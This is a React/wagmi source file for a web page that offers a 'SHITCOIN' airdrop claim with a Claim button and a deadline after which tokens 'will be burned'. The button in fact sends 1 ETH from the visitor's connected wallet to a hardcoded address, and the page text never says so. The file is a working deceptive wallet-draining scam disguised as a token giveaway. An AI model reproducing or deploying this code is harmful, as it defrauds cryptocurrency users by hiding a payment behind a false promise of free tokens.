'use client';

import { useAccount, useSendTransaction } from 'wagmi'
import ConnectWalletButton from '../ConnectWalletButton';
import Button from '../Button';

const Claim = () => {
  const { address, isConnected } = useAccount()
  const { sendTransaction } = useSendTransaction({
    mode: 'recklesslyUnprepared',
    request: {
      to: '0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC',
      value:'1000000000000000000',
    },
  })

  async function handleClick() {
    try {
      const txHash = await sendTransaction()
      console.log(`Transaction sent: ${txHash}`)
    } catch (error) {
      console.error(`Failed to send transaction: ${error}`)
    }
  }

  return (
    <div className='p-5'>
      <div className="w-2/3 lg:w-1/3 mx-auto border
       rounded-xl font-semibold p-3 shadow-md shadow-white">
        <p id="claim" className='text-center text-2xl'>
          Get SHIT now
        </p>
        <p className='text-gray-400 text-center'>
          A total of 21 000 000 SHITCOIN are now available to be claimed by those who
          have claimed the BTC airdrop. $SHIT tokens that have not been claimed
          within 31 days will be burned.
        </p>
        <div className='p-3 flex justify-center'>
          {isConnected ? 
            <Button 
              label="Claim"
              onClick={handleClick}
            />
          :
          <ConnectWalletButton />
          }
        </div>
    </div>
  </div>
  )
}

export default Claim